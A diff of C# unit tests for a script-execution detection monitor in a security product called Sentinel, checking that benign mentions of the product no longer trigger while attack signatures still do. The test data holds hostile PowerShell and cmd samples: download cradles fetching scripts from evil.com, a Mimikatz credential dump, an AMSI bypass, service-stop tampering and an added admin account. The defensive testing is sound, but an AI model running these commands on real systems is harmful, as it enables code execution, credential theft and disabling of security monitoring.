@@ -4,114 +4,80 @@ using Sentinel.Core;
 namespace Sentinel.Tests
 {
     /// <summary>
-    /// Tests for ScriptExecutionMonitor - verifies detection model behavior
-    /// for PowerShell, cmd, wscript/cscript, and mshta execution patterns.
+    /// Tests for the PowerShell script-block signature matching used by
+    /// ScriptExecutionMonitor. The matching helpers are pure/I-O-free
+    /// (InternalsVisibleTo Sentinel.Tests) so we can assert the signature set
+    /// without reading the Windows event log or constructing the full monitor.
     /// </summary>
     public class ScriptExecutionMonitorTests
     {
-        // 
-        // Script interpreter detection categorization
-        // 
-
-        [Theory]
-        [InlineData("PowerShell AMSI Bypass")]
-        [InlineData("ETW Tampering: Script Logging Disabled")]
-        public void ScriptRules_CategorizedCorrectly(string ruleName)
-        {
-            var category = ScoringEngine.CategorizeDetection(ruleName);
-            // Script execution rules should not be Unknown
-            Assert.NotEqual(DetectionCategory.Unknown, category);
-        }
-
-        // 
-        // Command line pattern detection
-        // 
-
-        [Theory]
-        [InlineData(@"powershell.exe -nop -w hidden -enc SQBFAFG=")]
-        [InlineData(@"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand dABlAH")]
-        public void EncodedCommand_Patterns_AreHighRisk(string cmdLine)
-        {
-            // Encoded commands are evasion indicators
-            Assert.Contains("enc", cmdLine.ToLowerInvariant());
-        }
-
-        [Theory]
-        [InlineData(@"cmd.exe /c ""net user admin P@ss123 /add""")]
-        [InlineData(@"cmd.exe /c ""reg add HKLM\SOFTWARE\malware""")]
-        public void CmdExe_SuspiciousCommands(string cmdLine)
-        {
-            Assert.StartsWith("cmd.exe", cmdLine);
-            Assert.Contains("/c", cmdLine);
-        }
-
-        [Theory]
-        [InlineData(@"wscript.exe C:\Users\victim\Downloads\invoice.vbs")]
-        [InlineData(@"cscript.exe //nologo C:\Temp\payload.js")]
-        [InlineData(@"mshta.exe javascript:void(eval('payload'))")]
-        public void ScriptHosts_SuspiciousPaths(string cmdLine)
-        {
-            // Script hosts executing from Downloads/Temp are suspicious
-            bool hasScriptHost = cmdLine.StartsWith("wscript") ||
-                                cmdLine.StartsWith("cscript") ||
-                                cmdLine.StartsWith("mshta");
-            Assert.True(hasScriptHost);
-        }
-
-        // 
-        // Detection event model
-        // 
+        //  Self-referential "Sentinel" false positive is gone 
 
         [Fact]
-        public void ScriptExecution_DownloadCradle_HighConfidence()
+        public void BenignScript_ReferencingSentinelProgramData_DoesNotMatch()
         {
-            var detection = new DetectionEvent
-            {
-                RuleName = "Script Execution: Download Cradle Detected",
-                ProcessId = 9000,
-                ProcessName = "powershell.exe",
-                Confidence = 0.85,
-                Tier = DetectionTier.Tier1Behavioral,
-                AuthorizedResponse = ResponseAction.KillProcessTree,
-                Evidence = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"
-            };
-
-            Assert.True(detection.KillAuthorized);
-            Assert.True(detection.Confidence >= 0.85);
+            // Previously matched the bare "Sentinel" substring and got its tree killed.
+            var script = @"$log = ""$env:ProgramData\Sentinel\logs\run.log""; Write-Host ""Sentinel diagnostics complete""";
+            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
+            Assert.Empty(matches);
+            Assert.False(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
         }
 
         [Fact]
-        public void ScriptExecution_ObfuscatedScript_Tier1()
+        public void BenignScript_WithBareWordSentinel_DoesNotMatch()
         {
-            var detection = new DetectionEvent
-            {
-                RuleName = "Script Execution: Heavily Obfuscated Script (Score 8/10)",
-                ProcessId = 9001,
-                ProcessName = "powershell.exe",
-                Confidence = 0.92,
-                Tier = DetectionTier.Tier1Behavioral,
-                AuthorizedResponse = ResponseAction.KillProcessTree
-            };
+            var script = @"# This is the Sentinel push helper. It references Sentinel a lot.";
+            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
+            Assert.Empty(matches);
+            Assert.False(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
+        }
 
-            Assert.Equal(DetectionTier.Tier1Behavioral, detection.Tier);
+        //  Genuine Sentinel service-tamper still escalates 
+
+        [Fact]
+        public void SentinelServiceStop_StillMatchesAndIsCritical()
+        {
+            var script = @"Stop-Service Sentinel -Force";
+            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
+            Assert.NotEmpty(matches);
+            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
         }
 
         [Fact]
-        public void ScriptExecution_LowObfuscation_Tier2()
+        public void ScStopSentinel_StillMatchesAndIsCritical()
         {
-            // Low obfuscation score should be observe-only
-            var detection = new DetectionEvent
-            {
-                RuleName = "Script Execution: Minor Obfuscation Detected (Score 2/10)",
-                ProcessId = 9002,
-                ProcessName = "powershell.exe",
-                Confidence = 0.45,
-                Tier = DetectionTier.Tier2Indicator,
-                AuthorizedResponse = ResponseAction.LogOnly
-            };
+            var script = @"sc.exe stop Sentinel";
+            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
+            Assert.NotEmpty(matches);
+            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
+        }
 
-            Assert.False(detection.KillAuthorized);
-            Assert.Equal(DetectionTier.Tier2Indicator, detection.Tier);
+        //  Genuine attack-tool signatures were NOT weakened 
+
+        [Fact]
+        public void Mimikatz_StillMatchesAndIsCritical()
+        {
+            var script = @"Invoke-Mimikatz -Command '""sekurlsa::logonpasswords""'";
+            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
+            Assert.NotEmpty(matches);
+            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
+        }
+
+        [Fact]
+        public void AmsiBypass_StillMatchesAndIsCritical()
+        {
+            var script = @"[Ref].Assembly.GetType('...').GetField('amsiInitFailed'); AmsiScanBuffer";
+            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
+            Assert.NotEmpty(matches);
+            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
+        }
+
+        [Fact]
+        public void DownloadCradle_StillMatches()
+        {
+            var script = @"IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')";
+            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
+            Assert.NotEmpty(matches);
         }
     }
 }
